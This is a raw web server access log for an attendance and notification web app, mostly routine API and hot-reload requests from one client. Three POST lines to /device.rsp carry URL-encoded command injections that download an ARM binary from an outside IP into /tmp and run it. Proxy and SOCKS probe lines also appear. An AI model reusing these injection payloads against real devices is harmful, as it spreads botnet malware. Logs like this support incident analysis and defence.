118.70.191.159 - - [07/May/2025:19:09:42 +0000] "GET / HTTP/1.1" 504 569 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:11:43 +0000] "GET /api-nodejs/users/details/thanhnpst1 HTTP/1.1" 200 1223 "http://fams.io.vn/Attendance" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:11:43 +0000] "GET /api-nodejs/attendance?userId=thanhnpst1&subjectId=&classId=&teacherName=&status=&date=&slotNumber=1&page=1&limit=330 HTTP/1.1" 200 83293 "http://fams.io.vn/Attendance" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:11:43 +0000] "GET /api-nodejs/users/details/thanhnpst1 HTTP/1.1" 200 1223 "http://fams.io.vn/Attendance" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:11:44 +0000] "GET /api-nodejs/classes HTTP/1.1" 200 5870 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:11:44 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 1133 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:11:44 +0000] "GET /api-nodejs/classes HTTP/1.1" 200 5870 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:11:44 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 1133 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:11:44 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 1133 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:11:44 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 1133 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:11:44 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 1133 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:11:44 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 1133 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:11:49 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=read HTTP/1.1" 200 1133 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:11:58 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=archive HTTP/1.1" 200 615 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:12:10 +0000] "GET /main.c0cf6336d05d1942ac3f.hot-update.js.map HTTP/1.1" 200 8663 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:12:10 +0000] "GET /main.22241d9bd6d5c99d1bb7.hot-update.js.map HTTP/1.1" 200 8702 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:12:10 +0000] "GET /main.f9d031d6eecbcaf8122e.hot-update.js.map HTTP/1.1" 200 8664 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:12:16 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=archive HTTP/1.1" 200 615 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:12:44 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 1133 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:13:01 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=read HTTP/1.1" 200 1133 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:13:07 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=archive HTTP/1.1" 200 615 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:13:44 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 1133 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:14:44 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 1133 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
103.77.172.142 - - [07/May/2025:20:15:39 +0000] "CONNECT www.google.com:443 HTTP/1.1" 400 157 "-" "-"
103.77.172.142 - - [07/May/2025:20:15:39 +0000] "\x05\x01\x00" 400 157 "-" "-"
103.77.172.142 - - [07/May/2025:20:15:39 +0000] "\x04\x01\x01\xBB\x8E\xFA\xC6\x84\x00" 400 157 "-" "-"
118.70.191.159 - - [07/May/2025:20:15:44 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 1133 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:15:59 +0000] "GET /ws HTTP/1.1" 101 61531 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:15:59 +0000] "GET /main.8820b29c4eb7febc728a.hot-update.json HTTP/1.1" 200 28 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:15:59 +0000] "GET /main.8820b29c4eb7febc728a.hot-update.js HTTP/1.1" 200 10464 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:15:59 +0000] "GET /main.8820b29c4eb7febc728a.hot-update.js.map HTTP/1.1" 200 8616 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:15:59 +0000] "GET /api-nodejs/classes HTTP/1.1" 200 5870 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:15:59 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 1133 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:15:59 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 1133 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:16:04 +0000] "GET /api-nodejs/users/details/thanhnpst1 HTTP/1.1" 200 1223 "http://fams.io.vn/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:16:04 +0000] "GET /api-nodejs/users/details/thanhnpst1 HTTP/1.1" 200 1223 "http://fams.io.vn/profile" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:16:05 +0000] "GET /api-nodejs/classes HTTP/1.1" 200 5870 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:16:05 +0000] "GET /api-nodejs/classes HTTP/1.1" 200 5870 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:16:05 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 1133 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:16:05 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 1133 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:16:06 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 1133 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:16:06 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 1133 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:16:30 +0000] "GET /main.f055a7efecc93f9f8d07.hot-update.json HTTP/1.1" 200 28 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:16:30 +0000] "GET /main.f055a7efecc93f9f8d07.hot-update.js HTTP/1.1" 200 5158 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
193.34.212.110 - - [07/May/2025:20:16:36 +0000] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20llarm7%3B%20wget%20http%3A%2F%2F103.188.82.240%2Fllarm7%3B%20chmod%20777%20%2A%3B%20.%2Fllarm7%20xpl5 HTTP/1.1" 404 150 "-" "Mozila/5.0"
20.80.72.204 - - [07/May/2025:20:17:52 +0000] "MGLNDD_14.225.204.42_80" 400 157 "-" "-"
118.70.191.159 - - [07/May/2025:20:18:19 +0000] "GET /ws HTTP/1.1" 101 60175 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:18:48 +0000] "GET /api-nodejs/users/details/thanhnpst1 HTTP/1.1" 200 1223 "http://fams.io.vn/Attendance" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:18:48 +0000] "GET /api-nodejs/attendance?userId=thanhnpst1&subjectId=&classId=&teacherName=&status=&date=&slotNumber=1&page=1&limit=330 HTTP/1.1" 200 83293 "http://fams.io.vn/Attendance" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:18:48 +0000] "GET /api-nodejs/users/details/thanhnpst1 HTTP/1.1" 200 1223 "http://fams.io.vn/Attendance" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:18:48 +0000] "GET /api-nodejs/attendance?userId=thanhnpst1&subjectId=&classId=&teacherName=&status=&date=&slotNumber=1&page=1&limit=330 HTTP/1.1" 200 83293 "http://fams.io.vn/Attendance" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:18:49 +0000] "GET /api-nodejs/classes HTTP/1.1" 200 5870 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:18:49 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 1133 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:18:49 +0000] "GET /api-nodejs/classes HTTP/1.1" 200 5870 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:18:49 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 1133 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:18:49 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 1133 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:18:49 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 1133 "http://fams.io.vn/Notify" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
141.98.11.27 - - [07/May/2025:20:18:55 +0000] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F103.149.29.68%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 150 "-" "Mozila/5.0"
118.70.191.159 - - [07/May/2025:20:19:10 +0000] "POST /api-nodejs/auth/login HTTP/1.1" 200 484 "http://fams.io.vn/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:19:10 +0000] "GET /api-nodejs/users/details/admin HTTP/1.1" 200 431 "http://fams.io.vn/AdminHomePage" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:19:10 +0000] "GET /api-nodejs/users/details/admin HTTP/1.1" 200 431 "http://fams.io.vn/AdminHomePage" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:19:12 +0000] "GET /api-nodejs/classes HTTP/1.1" 200 5870 "http://fams.io.vn/NotifyManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:19:12 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 3243 "http://fams.io.vn/NotifyManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:19:12 +0000] "GET /api-nodejs/classes HTTP/1.1" 200 5870 "http://fams.io.vn/NotifyManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:19:12 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 3243 "http://fams.io.vn/NotifyManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:19:12 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 3243 "http://fams.io.vn/NotifyManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:19:12 +0000] "GET /api-nodejs/notifications/my-notifications?page=1&limit=10&category=all HTTP/1.1" 200 3243 "http://fams.io.vn/NotifyManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:19:30 +0000] "GET /main.f055a7efecc93f9f8d07.hot-update.js.map HTTP/1.1" 200 4900 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:21:43 +0000] "GET /main.62940503267aa570a556.hot-update.json HTTP/1.1" 200 28 "http://fams.io.vn/NotifyManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:21:43 +0000] "GET /main.62940503267aa570a556.hot-update.js HTTP/1.1" 200 10490 "http://fams.io.vn/NotifyManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:21:43 +0000] "GET /main.62940503267aa570a556.hot-update.js.map HTTP/1.1" 200 8657 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:22:01 +0000] "GET /main.6f4bf9a6b77801cd7012.hot-update.json HTTP/1.1" 200 28 "http://fams.io.vn/NotifyManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:22:04 +0000] "GET /main.6f4bf9a6b77801cd7012.hot-update.js HTTP/1.1" 200 10517 "http://fams.io.vn/NotifyManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:22:04 +0000] "GET /main.6f4bf9a6b77801cd7012.hot-update.js.map HTTP/1.1" 200 8683 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:22:40 +0000] "GET /main.1d59072a8bd38c04474c.hot-update.json HTTP/1.1" 200 28 "http://fams.io.vn/NotifyManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:22:42 +0000] "GET /main.1d59072a8bd38c04474c.hot-update.js HTTP/1.1" 200 10573 "http://fams.io.vn/NotifyManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:22:42 +0000] "GET /main.1d59072a8bd38c04474c.hot-update.js.map HTTP/1.1" 200 8739 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:22:58 +0000] "GET /main.b650470e161e4b81b40d.hot-update.json HTTP/1.1" 200 28 "http://fams.io.vn/NotifyManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:22:58 +0000] "GET /main.b650470e161e4b81b40d.hot-update.js HTTP/1.1" 200 10599 "http://fams.io.vn/NotifyManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:22:58 +0000] "GET /main.b650470e161e4b81b40d.hot-update.js.map HTTP/1.1" 200 8752 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
118.70.191.159 - - [07/May/2025:20:25:45 +0000] "POST /api-nodejs/notifications/send-to-user HTTP/1.1" 201 165 "http://fams.io.vn/NotifyManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
141.98.11.27 - - [07/May/2025:20:26:07 +0000] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F103.149.29.68%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 150 "-" "Mozila/5.0"
118.70.191.159 - - [07/May/2025:20:26:07 +0000] "PATCH /api-nodejs/notifications/1746649529934/mark-as-read HTTP/1.1" 404 60 "http://fams.io.vn/NotifyManagement" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
